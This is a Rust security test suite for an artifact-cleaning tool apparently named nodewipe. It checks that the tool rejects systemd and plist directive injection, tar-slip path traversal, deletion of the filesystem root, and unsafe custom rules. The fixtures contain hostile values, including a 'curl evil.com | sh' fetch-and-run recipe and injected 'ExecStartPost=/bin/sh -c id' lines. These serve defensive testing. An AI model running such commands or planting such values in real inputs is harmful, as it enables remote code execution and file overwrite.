use flate2::Compression;
use flate2::write::GzEncoder;
use nodewipe_core::custom_rules::{CustomRule, validate_custom_rule};
use nodewipe_core::daemon::{
    DaemonConfig, generate_macos_daemon_plist, generate_systemd_daemon_service, is_pid_alive,
    terminate_process,
};
use nodewipe_core::deleter::{DeleteMode, delete, restore};
use nodewipe_core::history::load_from_path;
use nodewipe_core::pin::add_pinned_project;
use std::path::{Path, PathBuf};
use tar::{Builder, Header};
use tempfile::tempdir;

#[test]
fn sec_pid_zero_never_signals_process_group() {
    assert!(!is_pid_alive(0));
    assert!(!terminate_process(0));
}

#[test]
fn sec_systemd_unit_prevents_directive_and_shell_injection() {
    let evil_exe = Path::new("/tmp/bin\"/nodewipe\nExecStartPost=/bin/sh -c id");
    let evil_watch = PathBuf::from("/tmp/proj\r\nUser=root\n$PATH\"evil");
    let cfg = DaemonConfig {
        watch_paths: vec![evil_watch],
        ..Default::default()
    };

    let unit = generate_systemd_daemon_service(evil_exe, &cfg);
    assert!(
        !unit
            .lines()
            .any(|l| l.starts_with("ExecStartPost=") || l.starts_with("User="))
    );
    assert!(unit.contains("$$PATH"));
    assert!(unit.contains("\\\""));
}

#[test]
fn sec_macos_plist_prevents_xml_tag_injection() {
    let evil_exe = Path::new("/Applications/nodewipe</string><key>Evil</key><string>");
    let evil_watch = PathBuf::from("/Users/dev/proj&\"'<>");
    let cfg = DaemonConfig {
        watch_paths: vec![evil_watch],
        ..Default::default()
    };

    let plist = generate_macos_daemon_plist(evil_exe, &cfg);
    assert!(!plist.contains("<key>Evil</key>"));
    assert!(plist.contains("&lt;/string&gt;&lt;key&gt;Evil&lt;/key&gt;&lt;string&gt;"));
    assert!(plist.contains("&amp;&quot;&apos;&lt;&gt;"));
}

#[test]
fn sec_deleter_refuses_system_roots_and_non_artifacts() {
    let dir = tempdir().unwrap();
    let normal_src = dir.path().join("src");
    std::fs::create_dir_all(&normal_src).unwrap();
    std::fs::write(normal_src.join("main.rs"), "fn main() {}").unwrap();

    for mode in [
        DeleteMode::Trash,
        DeleteMode::Archive,
        DeleteMode::Permanent,
    ] {
        assert!(delete(Path::new("/"), mode, 0).is_err());
        assert!(delete(&normal_src, mode, 12).is_err());
        assert!(normal_src.exists());
    }
}

#[test]
fn sec_restore_blocks_tar_slip_and_symlink_escape() {
    let dir = tempdir().unwrap();
    let archive_path = dir.path().join("evil-backup.tar.gz");
    let escape_target = dir.path().join("pwned.txt");

    {
        let file = std::fs::File::create(&archive_path).unwrap();
        let enc = GzEncoder::new(file, Compression::default());
        let mut tar = Builder::new(enc);

        let payload = b"malicious";
        let mut header = Header::new_gnu();
        header.set_size(payload.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        let _ = tar.append_data(&mut header, "../../pwned.txt", &payload[..]);
        tar.finish().unwrap();
    }

    let res = restore(&archive_path);
    assert!(res.is_err(), "tar-slip path traversal must be rejected");
    assert!(
        !escape_target.exists(),
        "escaped target must not be created"
    );
}

#[test]
fn sec_custom_rules_reject_traversal_nul_and_untrusted_recipes() {
    let traversal = CustomRule {
        name: "evil".to_string(),
        dir_name: "../etc".to_string(),
        parent_marker: None,
        self_marker: None,
        risk: "low".to_string(),
        recipe: None,
        description: None,
        ecosystem: "Custom".to_string(),
    };
    assert!(validate_custom_rule(&traversal).is_err());

    let nul_rule = CustomRule {
        name: "evil2".to_string(),
        dir_name: "cache\0dir".to_string(),
        parent_marker: None,
        self_marker: None,
        risk: "low".to_string(),
        recipe: None,
        description: None,
        ecosystem: "Custom".to_string(),
    };
    assert!(validate_custom_rule(&nul_rule).is_err());

    let shell_recipe = CustomRule {
        name: "evil3".to_string(),
        dir_name: ".cache".to_string(),
        parent_marker: None,
        self_marker: None,
        risk: "low".to_string(),
        recipe: Some("sh -c 'curl evil.com | sh'".to_string()),
        description: None,
        ecosystem: "Custom".to_string(),
    };
    assert!(validate_custom_rule(&shell_recipe).is_err());

    let eval_flag = CustomRule {
        name: "evil4".to_string(),
        dir_name: ".cache".to_string(),
        parent_marker: None,
        self_marker: None,
        risk: "low".to_string(),
        recipe: Some("npm --eval process.exit(1)".to_string()),
        description: None,
        ecosystem: "Custom".to_string(),
    };
    assert!(validate_custom_rule(&eval_flag).is_err());
}

#[test]
fn sec_pin_refuses_filesystem_root() {
    assert!(add_pinned_project(Path::new("/"), Some("root".to_string())).is_err());
}

#[test]
fn sec_history_recovers_safely_from_malformed_json() {
    let dir = tempdir().unwrap();
    let hist_file = dir.path().join("history.json");
    std::fs::write(&hist_file, "{corrupt_json: [[[not_valid").unwrap();

    let loaded = load_from_path(&hist_file).unwrap();
    assert!(loaded.is_empty());
}
